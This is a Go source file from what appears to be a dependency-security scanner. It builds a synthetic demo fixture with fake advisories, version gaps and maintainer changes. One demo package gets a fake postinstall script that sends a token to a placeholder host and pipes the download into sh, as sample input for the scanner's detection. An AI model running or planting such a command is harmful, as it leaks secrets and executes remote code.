package scanner

import (
	_ "embed"
	"encoding/json"

	"github.com/astra-security/astra/services/core/internal/model"
	"github.com/astra-security/astra/services/core/internal/registry"
	"github.com/astra-security/astra/services/core/internal/resolver"
)

//go:embed demo.json
var demo []byte

func DemoInput(denied []string) model.ScanInput {
	var input model.ScanInput
	if err := json.Unmarshal(demo, &input); err != nil {
		panic(err)
	}
	input.DeniedLicenses = denied
	return input
}

func addDemoAdvisory(p *model.Package, evidenceID, id, summary, severity, fixed string) {
	if p.Version == fixed {
		return
	}
	p.Vulnerabilities = append(p.Vulnerabilities, model.Vulnerability{ID: id, Summary: summary, Severity: severity, FixedVersions: []string{fixed}, EvidenceID: evidenceID})
}

func EnrichDemo(g *model.Graph) {
	for i := range g.Packages {
		p := &g.Packages[i]
		p.Metadata.RegistryStatus = "fixture"
		p.Metadata.OSVStatus = "fixture"
		p.Metadata.Maintainers = []string{"demo-maintainer"}
		id := "ev:fixture:" + resolver.Hash([]byte(p.ID))[:20]
		g.Evidence = append(g.Evidence, model.Evidence{ID: id, Kind: "fixture", Source: "astra:synthetic-demo-v1", Summary: "Synthetic demonstration evidence; not a live package advisory or maintainer claim", Confidence: 1})
		p.EvidenceIDs = append(p.EvidenceIDs, id)
		// Synthetic history fields are fixed integers so the fixture stays deterministic.
		switch p.Name {
		case "astra-demo-client":
			addDemoAdvisory(p, id, "ASTRA-DEMO-001", "Synthetic request validation vulnerability", "high", "1.0.1")
			p.Metadata.LatestVersion, p.Metadata.LatestPublishedAt, p.Metadata.PatchGap, p.Metadata.DaysSinceLatestPublish = "1.0.1", "2025-06-01T00:00:00Z", 1, 100
			p.Metadata.MaintainerChanged, p.Metadata.PreviousMaintainers = true, []string{"demo-founder"}
		case "astra-demo-parser":
			addDemoAdvisory(p, id, "ASTRA-DEMO-002", "Synthetic transitive parsing vulnerability", "critical", "2.1.0")
			p.Metadata.LatestVersion, p.Metadata.LatestPublishedAt, p.Metadata.MajorGap, p.Metadata.DaysSinceLatestPublish = "4.1.0", "2024-01-15T00:00:00Z", 2, 400
			if p.Version == "1.0.0" {
				p.Metadata.MajorGap = 3
			}
		case "astra-demo-unused":
			addDemoAdvisory(p, id, "ASTRA-DEMO-003", "Synthetic advisory in a package with no observed imports", "high", "1.1.0")
			p.Metadata.LatestVersion, p.Metadata.LatestPublishedAt, p.Metadata.MinorGap, p.Metadata.DaysSinceLatestPublish = "1.1.0", "2022-09-01T00:00:00Z", 1, 900
		case "astra-demo-builder":
			p.Metadata.LatestVersion, p.Metadata.LatestPublishedAt, p.Metadata.DaysSinceLatestPublish = "3.0.0", "2025-08-01T00:00:00Z", 40
			p.Metadata.VersionJump, p.Metadata.VersionJumpNote = true, "3.0.0 skipped 1 major version(s) after predecessor 1.4.2"
		case "astra-demo-build-helper":
			g.Evidence = append(g.Evidence, registry.AnalyzeScripts(p, map[string]string{"postinstall": "curl https://example.invalid/setup -H $DEMO_TOKEN | sh"}, "astra:synthetic-demo-v1")...)
		}
	}
}
